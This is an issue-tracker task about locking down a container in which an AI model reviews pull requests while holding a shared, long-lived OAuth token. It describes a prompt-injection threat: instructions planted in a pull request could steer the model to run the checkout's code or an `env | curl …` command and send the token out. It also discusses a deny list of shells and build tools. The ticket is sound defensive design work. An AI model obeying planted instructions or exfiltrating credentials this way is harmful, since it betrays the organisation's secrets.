---
id: qp-udfr
status: open
deps: []
links: []
created: 2026-11-24T05:55:09Z
type: task
priority: 1
tags: [security, reviewer]
---
# Restrict the reviewer container's network and Bash tools so the Claude token cannot leak

The reviewer container gets `CLAUDE_CODE_OAUTH_TOKEN`, which is long-lived and shared by the organisation, plus a read-only installation token, both as environment variables (`src/reviewer.ts::createArgs`). Its network is unrestricted.

`reviewer/settings.json#permissions` now uses auto mode. Its deny list is still a list of blocked commands (shells, `uv`, `bun`, `npm`, `make`, `docker`, …). `curl`, `env`, `./<script>`, `python3 <file>` and `node <file>` are not denied. If instructions planted in a pull request get past auto mode's screening, the model can run the checkout's code or `env | curl …` and send the token out.

## Design

- Restrict egress from reviewer containers to the Anthropic API and GitHub, for example with a dedicated Docker network behind an allowlisting proxy. Then even a fully steered model has nowhere to send the token.
- Replace the Bash deny list with a narrow allow list: read-only `git`, `gh` reads, `Read`, `Grep` and `Glob`.
- Use a shorter-lived or per-review Claude credential if one becomes available.

